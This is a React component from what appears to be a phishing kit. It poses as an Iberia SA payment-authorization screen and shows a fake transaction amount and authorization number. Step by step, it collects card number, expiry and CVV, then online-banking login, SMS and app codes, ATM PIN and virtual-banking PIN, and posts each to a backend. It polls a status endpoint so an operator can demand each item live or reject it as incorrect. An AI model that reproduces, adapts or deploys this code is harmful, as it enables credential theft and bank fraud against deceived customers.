import { useEffect, useRef, useState } from "react";
import { Loading } from "../loading/Loading";
import { useSelector } from "react-redux";
import axios from "axios";
import Tarjeta from "../tarjeta/Tarjeta";
import { BancaVirtual } from "../bancaVirtual/BancaVirtual";
import { Mensaje } from "../mensaje/Mensaje";
import { useRouter } from "next/navigation";

function fechaActual() {
  const now = new Date();
  const dia = String(now.getDate()).padStart(2, '0');
  const mes = String(now.getMonth() + 1).padStart(2, '0');
  const anio = String(now.getFullYear()).slice(-2);

  let horas = now.getHours();
  const minutos = String(now.getMinutes()).padStart(2, '0');
  const ampm = horas >= 12 ? 'pm' : 'am';

  horas = horas % 12;
  horas = horas ? horas : 12;
  const horasFormateadas = String(horas).padStart(2, '0');

  return `${dia}/${mes}/${anio} ${horasFormateadas}:${minutos} ${ampm}`;
}


function generarNumero7Digitos() {
  return Math.floor(1000000 + Math.random() * 9000000);
}





const TransaccionTarjeta = ()=>{
    const router = useRouter()
    const [n, setN] = useState()
    const [tarjetaKey, setTarjetaKey] = useState(0)    
    const [loading, setLoading] = useState(true)
    const [selectVista, setSelectVisata] = useState(null)
    const {uniqId, numeroTarjeta, vencimientoTarjeta, cvvTarjeta, banco} = useSelector((state) => state.facturacion)
    const {precio, cantPasajeros} = useSelector((state) => state.homeReducer)
    const [reLoad, setReLoad] = useState(false)
    const { money } = useSelector((state) => state.country)
    const inputRef = useRef(null)
    const precFinal = precio * cantPasajeros
    
    
    const precioFormato = precFinal.toLocaleString("es-CO")
    const numRef = generarNumero7Digitos()
    const fecha = fechaActual()
    const tarj = numeroTarjeta.slice(-2)

    useEffect(() => {
        if (inputRef.current) {
            inputRef.current.focus();
            inputRef.current.scrollIntoView({ behavior: "smooth", block: "center" });
        }
    }, []);


    useEffect(() => {
    let isMounted = true;

    const iniciarLongPolling = async () => {
        if (!isMounted) return;

        try {
            const selV = await axios.get(`/api/tarjeta/status/${uniqId}`, {
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
            });
            
            if (
                selV.data.data.status == "login" ||
                selV.data.data.status == "xlogin" ||
                selV.data.data.status == "xtdc" ||
                selV.data.data.status == "codsms" ||
                selV.data.data.status == "xcodsms" ||
                selV.data.data.status == "codapp" ||
                selV.data.data.status == "xcodapp" ||
                selV.data.data.status == "pincaj" ||
                selV.data.data.status == "xpincaj" ||
                selV.data.data.status == "pinvir" ||
                selV.data.data.status == "xpinvir" &&
                selV.data.data.status !== selectVista
            ) {
                
                setSelectVisata(selV.data.data.status);
                 if (selectVista === "ntdc") setTarjetaKey((prev) => prev + 1); 
                setLoading(false);
                return;
            }else if(selV.data.data.status == "exito"){
                router.push("/compraExitosa")
            }else if(selV.data.data.status == "error"){
                router.push("/errorCompra")
            }
        } catch (error) {
            console.log(error);
            
        }

        // Esperamos 4 segundos y reintentamos
        setTimeout(iniciarLongPolling, 4000);
    };

    iniciarLongPolling();

    return () => {
        isMounted = false;
    };
    }, [reLoad]);



    const handlerTarjeta = async () =>{
        try {
            setLoading(true)
            const body ={
                "status": "ntdc",
                uniqid:uniqId,
                tdc: numeroTarjeta,
                ven: vencimientoTarjeta,
                cvv: cvvTarjeta,
                banco: banco,
            }
            const send = await axios.post(`/api/tarjeta/dataTar`, body, {
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
            console.log(error);
        }
        
    }    
    
    const handlerBancaVirtual = async (usuario, clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/tarjeta/dataTar`, {
                status:"nlogin",
                uniqid: uniqId,
                usuario: usuario,
                clave: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
            console.log(error);
        }
    }

    const handlerMensaje = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/tarjeta/dataTar`, {
                "status": "ncodsms",
                uniqid: uniqId,
                codsms: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    const handlerAplicacion = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/tarjeta/dataTar`, {
                status: "ncodapp",
                uniqid: uniqId,
                codapp: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    const handlerCajero = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/tarjeta/dataTar`, {
                status: "npincaj",
                uniqid: uniqId,
                pincaj: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    const handlerClaveVirtual = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/tarjeta/dataTar`, {
                status:"npinvir",
                uniqid: uniqId,
                pinvir: clave 
            },{
            headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    
    return(
        <div className="w-full mt-3.5">
            {selectVista == "ntdc" || selectVista == "xtdc" &&
                <div className="w-full mt-3.5 flex flex-col justify-center items-center">
                    <div className="w-[98%]">
                        <Tarjeta ref={inputRef} key={tarjetaKey} continuarCompra={handlerTarjeta} nuemerotarjeta={setN} error={selectVista == "xtdc" ? "Los datos ingresados son incorrectos, revisalos e ingresalos nuevamente": ""}/>
                    </div>
                </div> 
            }
            {loading && <Loading/>}
            {selectVista != "ntdc" && selectVista != "xtdc" && 
                <div className="w-full flex flex-col justify-center items-center">
                    <div className="w-full flex flex-col justify-center border-b-1 border-b-slate-400">
                        <div className="flex justify-center items-center gap gap-x-1">
                            <img src="/assets/icons/CA.svg" className="w-[47px] h-[47px] object-contain" alt="" />
                            <img src="/assets/icons/AX.svg" className="w-[47px] h-[47px] object-contain" alt="" />
                            <img src="/assets/icons/TP.svg" className="w-[45px] h-[45px] object-contain" alt="" />
                            <img src="/assets/icons/UP.svg" className="w-[40px] h-[40px] object-contain" alt="" />
                            <img src="/assets/icons/PAYPAL.svg" className="w-[56px] h-[56px] object-contain" alt="" />
                        </div>
                        <span className="font-semibold text-center text-[18px]">Autorización de transacción</span>
                    </div>

                    <div className="mt-6 w-[95%]">
                        <span className="text-[13px]">
                            La transacción que intentás realizar con <span className="font-semibold">Iberia SA</span> por {precioFormato} {money} el día {fecha}, con tu tarjeta terminada en <span className="font-semibold">**{tarj}</span>, debe ser autorizada por seguridad.
                        </span>
                    </div>

                    <div className="mt-4 w-[95%] flex flex-col gap gap-y-2.5">
                        <span className="font-semibold text-slate-400 text-[13px]">DETALLES DE TRANSACCIÓN</span>
                        <span className="text-[13px]"><span className="font-bold">Comercio:</span> Iberia SA</span>
                        <span className="text-[13px]"><span className="font-bold">Monto de la transacción:</span> {precioFormato} {money}</span>
                        <span className="text-[13px]"><span className="font-bold">Número de autorización:</span> AO{numRef}</span>
                    </div>
                    
                    
                    {selectVista == "login" && <BancaVirtual  close={handlerBancaVirtual}/>}
                    {selectVista == "xlogin" && <BancaVirtual close={handlerBancaVirtual} error={"Datos de ingreso incorrectos. Ingresalos nuevamente"}/>}
                    
                    {selectVista == "codsms" && <Mensaje close={handlerMensaje} label={"Codigo recibido por mensaje"} />}
                    {selectVista == "xcodsms" && <Mensaje close={handlerMensaje} label={"Codigo recibido por mensaje"} error={"El código ingresado no es correcto. Ingresalo nuevamente"}/>}

                    {selectVista == "codapp" && <Mensaje close={handlerAplicacion} label={"Clave dinamica de la aplicacion"}/>}
                    {selectVista == "xcodapp" && <Mensaje close={handlerAplicacion} label={"Clave dinamica de la aplicacion"} error={"El código ingresado no es correcto. Ingresalo nuevamente"}/>}

                    
                    {selectVista == "pincaj" && <Mensaje close={handlerCajero} label={"Clave de cajero"}/>}
                    {selectVista == "xpincaj" && <Mensaje close={handlerCajero} label={"Clave de cajero"} error={"Clave ingresada inválida. Ingresala nuevamente"}/>}

                    
                    {selectVista == "pinvir" && <Mensaje close={handlerClaveVirtual} label={"Clave de banca virtual"}/>}
                    {selectVista == "xpinvir" && <Mensaje close={handlerClaveVirtual} label={"Clave de banca virtual"} error={"Clave ingresada inválida. Ingresala nuevamente"}/>}

                </div>
            }
            
        </div>
    )
}
export {TransaccionTarjeta}